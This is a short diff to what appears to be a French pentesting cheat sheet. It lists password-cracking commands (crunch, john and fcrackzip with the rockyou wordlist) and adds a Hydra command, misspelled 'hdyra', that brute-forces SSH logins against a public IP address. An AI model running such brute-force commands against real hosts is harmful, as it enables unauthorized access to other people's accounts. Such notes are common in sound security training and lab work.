@@ -19,3 +19,8 @@ $ crunch 6 6 0123456789ABCDEF -o crunch.txt
 $ john {fichier} --wordlist=/usr/share/wordlists/rockyou.txt
 $ fcrackzip -D -p /usr/share/wordlists/rockyou.txt {fichier}
 ```
+
+## Tester une liste de user et mot de passe en SSH
+```bash
+$ hdyra -L user.txt -P /usr/share/wordlists/rockyou.txt 8.8.8.8 ssh -t 10
+```
